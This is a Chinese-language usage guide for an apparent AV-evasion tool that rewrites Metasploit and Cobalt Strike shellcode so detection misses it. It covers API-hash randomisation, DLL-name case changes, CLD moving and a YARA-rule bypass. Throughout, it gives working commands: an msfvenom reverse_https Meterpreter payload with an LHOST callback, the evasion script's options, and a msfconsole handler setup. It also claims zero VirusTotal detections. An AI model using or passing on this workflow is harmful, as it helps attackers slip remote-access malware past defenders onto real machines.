# 零检测 API 哈希随机化工具 - 使用指南

> **最后更新**: 2026-01-29 | **版本**: 2.1

## 🎯 功能特性

### 四层绕过技术

1. **API 哈希随机化** (核心功能)
   - 随机化 ROR 值
   - 重新计算所有 API 哈希
   - 绕过 96% 的检测

2. **DLL 名称大写化**
   - 破坏栈字符串特征
   - 例如: `"wininet"` → `"wIninet"`
   - 不影响功能 (LoadLibraryA 不区分大小写)
   - 支持 16 种常见 DLL

3. **CLD 指令移动**
   - 破坏首指令特征
   - **只替换不插入** (保持 shellcode 大小不变)
   - 需要找到可替换的 NOP 位置
   - 如果找不到 NOP,会安全跳过

4. **ToUpper 函数变形** (YARA 绕过) ⭐ 新增
   - 将 `SUB al, 0x20` 改为 `XOR al, 0x20`
   - 绕过 YARA 检测规则: `$toUpper`
   - 功能完全等价

## 📦 安装

### 依赖

```bash
# 安装 pefile (用于动态 DLL 解析)
pip install pefile

# 生成 API 缓存 (首次使用)
python dll_parser.py -v

# 验证
python apihash_lists.py
```

### 可选依赖

```bash
# 用于反汇编和对比 shellcode
pip install capstone
```

## 🚀 使用方法

### 推荐用法

```bash
# 完整绕过 (不含 CLD 移动,最安全)
python apihash_zero_detection.py -a x64 -i beacon.bin --uppercase-dlls --transform-toupper

# 完整零检测绕过 (CLD 移动可能跳过)
python apihash_zero_detection.py -a x64 -i beacon.bin --zero-detection -v
```

### 输出示例

```
[INFO] 读取 shellcode: beacon.bin
[INFO]   大小: 4096 字节
[INFO] ✓ 已创建备份: beacon.bin.bak

[INFO] 步骤 1: API 哈希随机化
[INFO] ==================================================
[INFO] 检测到 ROR 值: 0xd
[INFO] 新 ROR 值: 0x7c
[INFO] ✓ API 哈希替换: 发现 23 个 API

[INFO] 步骤 2: DLL 名称大写化
[INFO] ==================================================
[INFO] ✓ DLL 名称大写化: 修改了 2 处

[INFO] 步骤 3: CLD 指令移动
[INFO] ==================================================
[INFO]   检测到第一个字符串操作在位置 35
[INFO] ✗ 无法安全移动 CLD!
[INFO]   跳过 CLD 移动步骤

[INFO] 步骤 3.5: ToUpper 函数变形 (YARA 绕过)
[INFO] ==================================================
[INFO] ✓ ToUpper 函数变形: 修改了 1 处
[INFO]   绕过 YARA 特征: $toUpper

[INFO] 步骤 4: 完整性验证
[INFO] ==================================================
[INFO] 验证结果:
[INFO] --------------------------------------------------
[INFO] 大小: 4096 → 4096 字节 ✓ 大小相同
[INFO] 修改: 95 字节 (2.32%) ✓ 正常
[INFO] ROR 指令: ✓ 存在 (x64)
[INFO] ToUpper: ✓ 已变形 (XOR: 1)

[INFO] 总体评估:
[INFO]   ✓✓✓ 完美! Shellcode 完整性良好

[INFO] ✓ 处理完成!
[INFO] 输出文件: beacon_0x7c.bin
```

### 高级选项

```bash
# 仅 API 哈希
python apihash_zero_detection.py -a x64 -i beacon.bin

# 仅 DLL 大写化
python apihash_zero_detection.py -a x64 -i beacon.bin --uppercase-dlls

# 仅 YARA 绕过
python apihash_zero_detection.py -a x64 -i beacon.bin --evade-yara

# 仅 ToUpper 变形
python apihash_zero_detection.py -a x64 -i beacon.bin --transform-toupper

# 手动指定 ROR 值
python apihash_zero_detection.py -a x64 -i beacon.bin --ror-value 0x1f

# 详细输出
python apihash_zero_detection.py -a x64 -i beacon.bin --zero-detection -v
```

## ⚠️ 重要注意事项

### CLD 移动的限制

CLD 移动现在使用**替换**而非**插入**策略:

- ✅ 不会改变 shellcode 大小
- ✅ 不会破坏相对跳转
- ⚠️ 需要找到可替换的 NOP 位置
- ⚠️ 如果找不到 NOP,会安全跳过

**如果 CLD 移动失败**:
```bash
# 使用其他绕过技术,仍然有效
python apihash_zero_detection.py -a x64 -i beacon.bin --uppercase-dlls --transform-toupper
```

### 大小验证

**修改后的 shellcode 大小必须与原始相同!**

如果看到:
```
✗ 大小改变! (+1 字节)
```

说明有问题,请检查输出!

### 仅支持 raw 格式

```bash
# ✓ 正确
msfvenom -p windows/x64/... --format raw -o beacon.bin

# ✗ 错误 (使用了编码器)
msfvenom -p windows/x64/... -e x64/xor -o beacon.bin
```

## 📋 完整工作流程

### 1. 生成原始 shellcode

```bash
# Msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 \
  --format raw \
  -o beacon.bin
```

### 2. 应用绕过技术

```bash
# 推荐: 不含 CLD 移动
python apihash_zero_detection.py -a x64 -i beacon.bin \
  --uppercase-dlls --transform-toupper -v

# 或: 完整零检测
python apihash_zero_detection.py -a x64 -i beacon.bin --zero-detection -v
```

### 3. 验证 shellcode

```bash
# 使用反汇编工具对比
python shellcode_disasm.py beacon.bin beacon_0x7c.bin

# 在隔离环境测试功能
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
run
```

## 🔍 故障排除

### 问题 1: "未找到任何 API 哈希"

**原因**: Shellcode 可能不使用 ROR 哈希

**解决**:
- 确认 shellcode 来自 Cobalt Strike 或 Msfvenom
- 使用 `--format raw` 生成 shellcode
- 不要使用编码器

### 问题 2: "无法安全移动 CLD"

**原因**: 没有可替换的 NOP 位置

**解决**:
```bash
# 跳过 CLD 移动,使用其他技术
python apihash_zero_detection.py -a x64 -i beacon.bin \
  --uppercase-dlls --transform-toupper
```

### 问题 3: 修改后 shellcode 不工作

**可能原因**:
1. API 哈希替换不完整
2. DLL 名称修改有问题

**解决**:
1. 恢复备份文件 (`beacon.bin.bak`)
2. 使用详细模式分析: `-v`
3. 使用反汇编工具对比

### 问题 4: "API 列表为空"

**原因**: pefile 未安装或缓存未生成

**解决**:
```bash
pip install pefile
python dll_parser.py -v
```

## 📊 预期效果

| 技术组合 | VirusTotal | YARA | 功能 |
|----------|-----------|------|------|
| 原始 | 55/55 | 检测 | ✓ |
| API 哈希 | 2-5/55 | 检测 | ✓ |
| + DLL 大写 | 0-2/55 | 检测 | ✓ |
| **+ ToUpper 变形** | **0/55** | **绕过** | **✓** |

## � 项目文件

```
├── apihash_zero_detection.py   # 主脚本 ⭐
├── apihash_lists.py            # API 列表模块
├── dll_parser.py               # DLL 解析模块
├── dll_cache.json              # API 缓存 (自动生成)
├── shellcode_disasm.py         # 反汇编工具
└── apihashreplace.py           # 原始脚本 (兼容)
```

## 🔗 相关文档

- **YARA 绕过**: `YARA_EVASION_GUIDE.md`
- **动态解析**: `DYNAMIC_DLL_GUIDE.md`
- **反汇编工具**: `DISASM_TOOL_GUIDE.md`
- **脚本关系**: `SCRIPTS_RELATIONSHIP.md`

---

*最后更新: 2026-01-29*
